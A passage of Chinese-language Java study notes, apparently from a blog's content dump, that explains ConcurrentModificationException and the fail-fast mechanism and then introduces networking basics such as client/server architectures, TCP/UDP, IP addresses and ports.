class="line"></span><br><span class="line">    <span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">checkForComodification</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (modCount != expectedModCount)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>根据代码可知，每次迭代list时，会初始化Itr的三个成员变量</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> cursor = <span class="number">0</span>;   <span class="comment">//将要访问的元素的索引</span></span><br><span class="line"><span class="keyword">int</span> lastRet = -<span class="number">1</span>;  <span class="comment">//上一个访问元素的索引</span></span><br><span class="line"><span class="keyword">int</span> expectedModCount = modCount; <span class="comment">//预期修改值，初始化等于modCount（AbstractList类中的一个成员变量）</span></span><br></pre></td></tr></table></figure>

<p>接着调用<code>hasNext()</code>循环判断访问元素的下标是否到达末尾。如果没有，调用<code>next()</code>方法，取出元素。<br> 而最上面测试代码出现异常的原因在于，<code>next()</code>方法调用<code>checkForComodification()</code>时，发现了<code>modCount != expectedModCount</code></p>
<p>接下来我们看下ArrayList的源码，了解下modCount 是如何与expectedModCount不相等的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E paramE)</span> </span>&#123;  </span><br><span class="line">    ensureCapacityInternal(<span class="keyword">this</span>.size + <span class="number">1</span>);  </span><br><span class="line">    <span class="comment">/** 省略此处代码 */</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ensureCapacityInternal</span><span class="params">(<span class="keyword">int</span> paramInt)</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.elementData == EMPTY_ELEMENTDATA)  </span><br><span class="line">        paramInt = Math.max(<span class="number">10</span>, paramInt);  </span><br><span class="line">    ensureExplicitCapacity(paramInt);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ensureExplicitCapacity</span><span class="params">(<span class="keyword">int</span> paramInt)</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">this</span>.modCount += <span class="number">1</span>;    <span class="comment">//修改modCount  </span></span><br><span class="line">    <span class="comment">/** 省略此处代码 */</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">remove</span><span class="params">(Object paramObject)</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">int</span> i;  </span><br><span class="line">    <span class="keyword">if</span> (paramObject == <span class="keyword">null</span>)  </span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.size; ++i) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.elementData[i] != <span class="keyword">null</span>)  </span><br><span class="line">                <span class="keyword">continue</span>;  </span><br><span class="line">            fastRemove(i);  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.size; ++i) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (!(paramObject.equals(<span class="keyword">this</span>.elementData[i])))  </span><br><span class="line">                <span class="keyword">continue</span>;  </span><br><span class="line">            fastRemove(i);  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">fastRemove</span><span class="params">(<span class="keyword">int</span> paramInt)</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">this</span>.modCount += <span class="number">1</span>;   <span class="comment">//修改modCount  </span></span><br><span class="line">    <span class="comment">/** 省略此处代码 */</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">this</span>.modCount += <span class="number">1</span>;    <span class="comment">//修改modCount  </span></span><br><span class="line">    <span class="comment">/** 省略此处代码 */</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从上面的代码可以看出，ArrayList的add、remove、clear方法都会造成modCount的改变。迭代过程中如何调用这些方法就会造成modCount的增加，使迭代类中expectedModCount和modCount不相等。</p>
<h3 id="异常的解决"><a href="#异常的解决" class="headerlink" title="异常的解决"></a>异常的解决</h3><h4 id="1-单线程环境"><a href="#1-单线程环境" class="headerlink" title="1. 单线程环境"></a>1. 单线程环境</h4><p>好，现在我们已经基本了解了异常的发送原因了。接下来我们来解决它。<br> 我很任性，我就是想在迭代集合时删除集合的元素，怎么办？</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Iterator&lt;String&gt; iter = list.iterator();</span><br><span class="line"><span class="keyword">while</span>(iter.hasNext())&#123;</span><br><span class="line">    String str = iter.next();</span><br><span class="line">      <span class="keyword">if</span>( str.equals(<span class="string">"B"</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        iter.remove();</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>细心的朋友会发现Itr中的也有一个remove方法，实质也是调用了ArrayList中的remove，但增加了<code>expectedModCount = modCount;</code>保证了不会抛出java.util.ConcurrentModificationException异常。</p>
<p>但是，这个办法的有两个弊端<br> 1.只能进行remove操作，add、clear等Itr中没有。<br> 2.而且只适用单线程环境。</p>
<h4 id="2-多线程环境"><a href="#2-多线程环境" class="headerlink" title="2. 多线程环境"></a>2. 多线程环境</h4><p>在多线程环境下，我们再次试验下上面的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test2</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        list.add(<span class="string">"a"</span>);</span><br><span class="line">        list.add(<span class="string">"b"</span>);</span><br><span class="line">        list.add(<span class="string">"c"</span>);</span><br><span class="line">        list.add(<span class="string">"d"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                Iterator&lt;String&gt; iterator = list.iterator();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName() + <span class="string">":"</span></span><br><span class="line">                            + iterator.next());</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                Iterator&lt;String&gt; iterator = list.iterator();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">                    String element = iterator.next();</span><br><span class="line">                    System.out.println(Thread.currentThread().getName() + <span class="string">":"</span></span><br><span class="line">                            + element);</span><br><span class="line">                    <span class="keyword">if</span> (element.equals(<span class="string">"c"</span>)) &#123;</span><br><span class="line">                        iterator.remove();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;.start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2021/01/23/IsRLXBKhnYrMtak.png" alt="image-20210123163639888"></p>
<p>异常的原因很简单，一个线程修改了list的modCount导致另外一个线程迭代时modCount与该迭代器的expectedModCount不相等。</p>
<p>此时有两个办法：</p>
<ol>
<li>迭代前加锁，解决了多线程问题，但还是不能进行迭代add、clear等操作</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test2</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        list.add(<span class="string">"a"</span>);</span><br><span class="line">        list.add(<span class="string">"b"</span>);</span><br><span class="line">        list.add(<span class="string">"c"</span>);</span><br><span class="line">        list.add(<span class="string">"d"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                Iterator&lt;String&gt; iterator = list.iterator();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">synchronized</span> (list) &#123;</span><br><span class="line">                    <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">                        System.out.println(Thread.currentThread().getName()</span><br><span class="line">                                + <span class="string">":"</span> + iterator.next());</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                Iterator&lt;String&gt; iterator = list.iterator();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">synchronized</span> (list) &#123;</span><br><span class="line">                    <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">                        String element = iterator.next();</span><br><span class="line">                        System.out.println(Thread.currentThread().getName()</span><br><span class="line">                                + <span class="string">":"</span> + element);</span><br><span class="line">                        <span class="keyword">if</span> (element.equals(<span class="string">"c"</span>)) &#123;</span><br><span class="line">                            iterator.remove();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;.start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>采用CopyOnWriteArrayList，解决了多线程问题，同时可以add、clear等操作</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test2</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> List&lt;String&gt; list = <span class="keyword">new</span> CopyOnWriteArrayList&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        list.add(<span class="string">"a"</span>);</span><br><span class="line">        list.add(<span class="string">"b"</span>);</span><br><span class="line">        list.add(<span class="string">"c"</span>);</span><br><span class="line">        list.add(<span class="string">"d"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                Iterator&lt;String&gt; iterator = list.iterator();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">                        System.out.println(Thread.currentThread().getName()</span><br><span class="line">                                + <span class="string">":"</span> + iterator.next());</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                Iterator&lt;String&gt; iterator = list.iterator();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">                        String element = iterator.next();</span><br><span class="line">                        System.out.println(Thread.currentThread().getName()</span><br><span class="line">                                + <span class="string">":"</span> + element);</span><br><span class="line">                        <span class="keyword">if</span> (element.equals(<span class="string">"c"</span>)) &#123;</span><br><span class="line">                            list.remove(element);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;.start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>CopyOnWriteArrayList也是一个线程安全的ArrayList，其实现原理在于，每次add,remove等所有的操作都是重新创建一个新的数组，再把引用指向新的数组。</p>
<h3 id="深入理解异常—fail-fast机制"><a href="#深入理解异常—fail-fast机制" class="headerlink" title="深入理解异常—fail-fast机制"></a>深入理解异常—fail-fast机制</h3><p>到这里，我们似乎已经理解完这个异常的产生缘由了。<br> 但是，仔细思考，还是会有几点疑惑：</p>
<ol>
<li>既然modCount与expectedModCount不同会产生异常，那为什么还设置这个变量</li>
<li>ConcurrentModificationException可以翻译成“并发修改异常”，那这个异常是否与多线程有关呢？</li>
</ol>
<p>我们来看看源码中modCount的注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The number of times this list has been &lt;i&gt;structurally modified&lt;/i&gt;.</span></span><br><span class="line"><span class="comment">     * Structural modifications are those that change the size of the</span></span><br><span class="line"><span class="comment">     * list, or otherwise perturb it in such a fashion that iterations in</span></span><br><span class="line"><span class="comment">     * progress may yield incorrect results.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;This field is used by the iterator and list iterator implementation</span></span><br><span class="line"><span class="comment">     * returned by the &#123;<span class="doctag">@code</span> iterator&#125; and &#123;<span class="doctag">@code</span> listIterator&#125; methods.</span></span><br><span class="line"><span class="comment">     * If the value of this field changes unexpectedly, the iterator (or list</span></span><br><span class="line"><span class="comment">     * iterator) will throw a &#123;<span class="doctag">@code</span> ConcurrentModificationException&#125; in</span></span><br><span class="line"><span class="comment">     * response to the &#123;<span class="doctag">@code</span> next&#125;, &#123;<span class="doctag">@code</span> remove&#125;, &#123;<span class="doctag">@code</span> previous&#125;,</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@code</span> set&#125; or &#123;<span class="doctag">@code</span> add&#125; operations.  This provides</span></span><br><span class="line"><span class="comment">     * &lt;i&gt;fail-fast&lt;/i&gt; behavior, rather than non-deterministic behavior in</span></span><br><span class="line"><span class="comment">     * the face of concurrent modification during iteration.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;&lt;b&gt;Use of this field by subclasses is optional.&lt;/b&gt; If a subclass</span></span><br><span class="line"><span class="comment">     * wishes to provide fail-fast iterators (and list iterators), then it</span></span><br><span class="line"><span class="comment">     * merely has to increment this field in its &#123;<span class="doctag">@code</span> add(int, E)&#125; and</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@code</span> remove(int)&#125; methods (and any other methods that it overrides</span></span><br><span class="line"><span class="comment">     * that result in structural modifications to the list).  A single call to</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@code</span> add(int, E)&#125; or &#123;<span class="doctag">@code</span> remove(int)&#125; must add no more than</span></span><br><span class="line"><span class="comment">     * one to this field, or the iterators (and list iterators) will throw</span></span><br><span class="line"><span class="comment">     * bogus &#123;<span class="doctag">@code</span> ConcurrentModificationExceptions&#125;.  If an implementation</span></span><br><span class="line"><span class="comment">     * does not wish to provide fail-fast iterators, this field may be</span></span><br><span class="line"><span class="comment">     * ignored.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">transient</span> <span class="keyword">int</span> modCount = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>我们注意到，注解中频繁的出现了<code>fail-fast</code><br> 那么<code>fail-fast</code>（快速失败）机制是什么呢？</p>
<blockquote>
<p>“快速失败”也就是fail-fast，它是Java集合的一种错误检测机制。当多个线程对集合进行结构上的改变的操作时，有可能会产生fail-fast机制。记住是有可能，而不是一定。例如：假设存在两个线程（线程1、线程2），线程1通过Iterator在遍历集合A中的元素，在某个时候线程2修改了集合A的结构（是结构上面的修改，而不是简单的修改集合元素的内容），那么这个时候程序就会抛出 ConcurrentModificationException 异常，从而产生fail-fast机制。</p>
</blockquote>
<p>看到这里，我们明白了，fail-fast机制就是为了防止多线程修改集合造成并发问题的机制嘛。<br> 之所以有modCount这个成员变量，就是为了辨别多线程修改集合时出现的错误。而java.util.ConcurrentModificationException就是并发异常。<br> 但是单线程使用不单时也可能抛出这个异常。</p>
<h2 id="7：Collections和Arrays"><a href="#7：Collections和Arrays" class="headerlink" title="7：Collections和Arrays"></a>7：Collections和Arrays</h2><p>这里只介绍2个常用的Collections.addAll和Arrays.asList</p>
<p>addAll：</p>
<p><img data-src="https://i.loli.net/2021/01/23/ZC5GjbMfJkdS9xY.png" alt="img"></p>
<p>asList采用的是数组</p>
<p><img data-src="https://i.loli.net/2021/01/23/TEuO75x4IzgwcY9.png" alt="img"></p>
<p>可以看出最终转换成ArrayList。</p>
<h2 id="8：总结"><a href="#8：总结" class="headerlink" title="8：总结"></a>8：总结</h2><p>1）：数组是将数字和对象联系起来，它保存明确的对象，查询对象时候不需要对查询结果进行转换，它可以是多维的，可以保存基本类型的数据，但是数组一旦生成，其容量不能改变。所以数组是不可以直接删除和添加元素。</p>
<p>2）：Collection保存单一的元素，而Map保存相关联的值键对，有了Java泛型，可以指定容器存放对象类型，不会将错误类型的对象放在容器中，取元素时候也不需要转型。而且Collection和Map都可以自动调整其尺寸。容器不可以持有基本类型。</p>
<p>3）：像数组一样，List也建立数字索性和对象的关联，因此，数组和List都是排好序的容器，List可以自动扩容</p>
<p>4）：如果需要大量的随机访问就要使用ArrayList，如果要经常从中间插入和删除就要使用LinkedList。</p>
<p>5）：各种Queue和Stack由LinkedList支持</p>
<p>6）：Map是一种将对象（而非数字）与对象相关联的设计。HashMap用于快速访问，TreeMap保持键始终处于排序状态，所以不如HashMap快，而LinkedHashMap保持元素插入的顺序，但是也通过散列提供了快速访问的能力</p>
<p>7）：Set不接受重复的元素，HashSet提供最快的访问能力，TreeSet保持元素排序状态，LinkedHashSet以插入顺序保存元素。</p>
]]></content>
      <categories>
        <category>Information Security Study</category>
        <category>Code Language</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java中的网络编程</title>
    <url>/hexo-test/Information-Security-Study/Code-Language/Java/Java%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="第一章-网络编程入门"><a href="#第一章-网络编程入门" class="headerlink" title="第一章 网络编程入门"></a>第一章 网络编程入门</h1><h2 id="1-1软件结构"><a href="#1-1软件结构" class="headerlink" title="1.1软件结构"></a>1.1软件结构</h2><ul>
<li><strong>C/S 结构：</strong>全称为 Client/Server 结构，指 客户端/服务器 结构。常见的程序有 QQ、迅雷等程序。</li>
</ul>
<p><img data-src="https://i.loli.net/2021/01/23/1FayCHg5nRGkQoe.png" alt="1566446300784"></p>
<ul>
<li><strong>B/S 结构</strong>：全称为 Browser/Server 结构，是指浏览器和服务器结构。如：谷歌、火狐</li>
</ul>
<p><img data-src="https://i.loli.net/2021/01/23/oXJ7InRzlCtBxbZ.png" alt="1566446315067"></p>
<h2 id="1-2-两种软件结构的区别"><a href="#1-2-两种软件结构的区别" class="headerlink" title="1.2 两种软件结构的区别"></a>1.2 两种软件结构的区别</h2><p><strong>CS即Client/Server(客户机/服务器)结构</strong>：C/S结构在技术上很成熟，它的主要特点是交互性强、具有安全的存取模式、网络通信量低、响应速度快、利于处理大量数据。但是该结构的程序是针对性开发，变更不够灵活，维护和管理的难度较大。通常只局限于小型局域网，不利于扩展。并且，由于该结构的每台客户机都需要安装相应的客户端程序，分布功能弱且兼容性差，不能实现快速部署安装和配置，因此缺少通用性，具有较大的局限性。要求具有一定专业水准的技术人员去完成。  </p>
<p><strong>BS即Browser/Server(浏览器/服务器)结构</strong>：就是只安装维护一个服务器(Server)，而客户端采用浏览器(Browse)运行软件。B/S结构应用程序相对于传统的C/S结构应用程序是一个非常大的进步。B/S结构的主要特点是分布性强、维护方便、开发简单且共享性强、总体拥有成本低。但数据安全性问题、对服务器要求过高、数据传输速度慢、软件的个性化特点明显降低，这些缺点是有目共睹的，难以实现传统模式下的特殊功能要求。例如：通过浏览器进行大量的数据输入或进行报表的应答、专用性打印输出都比较困难和不便。此外，实现复杂的应用构造有较大的困难。</p>
<p><strong>优缺点：</strong></p>
<table>
<thead>
<tr>
<th>结构模式</th>
<th>C/S 结构</th>
<th>B/S 结构</th>
</tr>
</thead>
<tbody><tr>
<td>开发维护成本</td>
<td>较高，对于不同的客户端需要开发不同的程序，而且软件的安装调试和升级都需要在所有的客户机上进行</td>
<td>较低，只需要将客户端上的软件版本升级，然后重新登录即可</td>
</tr>
<tr>
<td>客户端负载</td>
<td>大，C/S 客户端不仅负责和用户的交互，收集用户的信息，而且还需要通过网络向服务器发出请求</td>
<td>小，B/S 把事务处理逻辑部分交给了服务器，客户端只负责显示</td>
</tr>
<tr>
<td>安全性</td>
<td>高，C/S 客户端适用于专人专用的系统，可以通过严格的管理派发软件</td>
<td>低，B/S 使用人数多，不固定，安全性低</td>
</tr>
<tr>
<td>作用范围</td>
<td>C/S 是建立在局域网的基础上的</td>
<td>B/S 是建立在广域网的基础上的</td>
</tr>
</tbody></table>
<p>但无论是那种结构，都离不开网络的支持。网络编程，就是在一定的协议下，实现两台计算机的通信的程序。</p>
<a id="more"></a>

<h2 id="1-3-网络通信协议"><a href="#1-3-网络通信协议" class="headerlink" title="1.3 网络通信协议"></a>1.3 网络通信协议</h2><ul>
<li><strong>网络通信协议：</strong>通信协议是对计算机必须遵守的规则，只有遵守这些规则，计算机之间才能进行通信。这就好比在道路中行驶的汽车一定要遵守交通规则一样，协议中对数据的传输格式、传输速率、传输步骤等做了统一规定，通信双方必须同时遵守，最终完成数据交换。 </li>
<li><strong>TCP/IP协议：</strong> 传输控制协议/因特网互联协议( Transmission Control Protocol/Internet Protocol)，是Internet最基本、最广泛的协议。它定义了计算机如何连入因特网，以及数据如何在它们之间传输的标准。它的内部包含一系列的用于处理数据通信的协议，并采用了4层的分层模型，每一层都呼叫它的下一层所提供的协议来完成自己的需求。</li>
</ul>
<p><img data-src="https://i.loli.net/2021/01/23/lZ19PAXpBeVo5Ri.png" alt="1566446331855"></p>
<h2 id="1-4-协议分类"><a href="#1-4-协议分类" class="headerlink" title="1.4 协议分类"></a>1.4 协议分类</h2><p>通信的协议还是比较复杂的，<code>java.net</code> 包中包含的类和接口，它们提供低层次的通信细节。我们可以直接使用这些类和接口，来专注于网络程序开发，而不用考虑通信的细节。</p>
<p><code>java.net</code> 包中提供了两种常见的网络协议的支持：</p>
<ul>
<li><p><strong>TCP</strong>：传输控制协议 (Transmission Control Protocol)。TCP协议是<strong>面向连接</strong>的通信协议，即传输数据之前，在发送端和接收端建立逻辑连接，然后再传输数据，它提供了两台计算机之间<strong>可靠无差错</strong>的数据传输。</p>
<ul>
<li><p>三次握手：TCP协议中，在发送数据的准备阶段，客户端与服务器之间的三次交互，以保证连接的可靠。</p>
<ul>
<li>第一次握手，客户端向服务器端发出连接请求，等待服务器确认。服务器你死了吗？</li>
<li>第二次握手，服务器端向客户端回送一个响应，通知客户端收到了连接请求。我活着啊！！</li>
<li>第三次握手，客户端再次向服务器端发送确认信息，确认连接。整个交互过程如下图所示。我知道了！！</li>
</ul>
<p><img data-src="https://i.loli.net/2021/01/23/PfdG6ytxQO9uK3a.png" alt="1566446712862"></p>
</li>
</ul>
<p>完成三次握手，连接建立后，客户端和服务器就可以开始进行数据传输了。由于这种面向连接的特性，TCP协议可以保证传输数据的安全，所以应用十分广泛，例如下载文件、浏览网页等。</p>
</li>
<li><p><strong>UDP</strong>：用户数据报协议(User Datagram Protocol)。UDP协议是一个<strong>面向无连接</strong>的协议。传输数据时，不需要建立连接，不管对方端服务是否启动，直接将数据、数据源和目的地都封装在数据包中，直接发送。每个数据包的大小限制在64k以内。它是不可靠协议，因为无连接，所以传输速度快，但是容易丢失数据。日常应用中,例如视频会议、QQ聊天等。</p>
</li>
</ul>
<h2 id="1-5-网络编程三要素"><a href="#1-5-网络编程三要素" class="headerlink" title="1.5 网络编程三要素"></a>1.5 网络编程三要素</h2><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><ul>
<li><strong>协议：</strong>计算机网络通信必须遵守的规则，已经介绍过了，不再赘述。</li>
</ul>
<h3 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h3><ul>
<li><strong>IP地址：指互联网协议地址（Internet Protocol Address）</strong>，俗称IP。IP地址用来给一个网络中的计算机设备做唯一的编号。假如我们把“个人电脑”比作“一台电话”的话，那么“IP地址”就相当于“电话号码”。</li>
</ul>
<p>*<em>IP地址分类 *</em>   [][][][] o o o o</p>
<ul>
<li><p>IPv4：是一个32位的二进制数，通常被分为4个字节，表示成<code>a.b.c.d</code> 的形式，例如<code>192.168.65.100</code> 。其中a、b、c、d都是0~255之间的十进制整数，那么最多可以表示42亿个。</p>
</li>
<li><p>IPv6：由于互联网的蓬勃发展，IP地址的需求量愈来愈大，但是网络地址资源有限，使得IP的分配越发紧张。有资料显示，全球IPv4地址在2011年2月分配完毕。</p>
<p>为了扩大地址空间，拟通过IPv6重新定义地址空间，采用128位地址长度，每16个字节一组，分成8组十六进制数，表示成<code>ABCD:EF01:2345:6789:ABCD:EF01:2345:6789</code>，号称可以为全世界的每一粒沙子编上一个网址，这样就解决了网络地址资源数量不够的问题。</p>
</li>
</ul>
<p><strong>常用命令</strong></p>
<ul>
<li>查看本机IP地址，在控制台输入：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure>

<ul>
<li>检查网络是否连通，在控制台输入：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ping 空格 IP地址</span><br><span class="line">ping <span class="number">220.181</span><span class="number">.57</span><span class="number">.216</span></span><br><span class="line">ping www.baidu.com</span><br></pre></td></tr></table></figure>

<p><strong>特殊的IP地址</strong></p>
<ul>
<li>本机IP地址：<code>127.0.0.1</code>、<code>localhost</code> 。</li>
</ul>
<h3 id="端口号"><a href="#端口号" class="headerlink" title="端口号"></a>端口号</h3><p>网络的通信，本质上是两个进程（应用程序）的通信。每台计算机都有很多的进程，那么在网络通信时，如何区分这些进程呢？</p>
<p>如果说<strong>IP地址</strong>可以唯一标识网络中的设备，那么<strong>端口号</strong>就可以唯一标识设备中的进程（应用程序）了。</p>
<ul>
<li><strong>端口号：用两个字节表示的整数，它的取值范围是0~65535</strong>。其中，0~1023之间的端口号用于一些知名的网络服务和应用，普通的应用程序需要使用1024以上的端口号。如果端口号被另外一个服务或应用所占用，会导致当前程序启动失败。</li>
</ul>
<p>利用<code>协议</code>+<code>IP地址</code>+<code>端口号</code> 三元组合，就可以标识网络中的进程了，那么进程间的通信就可以利用这个标识与其它进程进行交互。ddress</p>
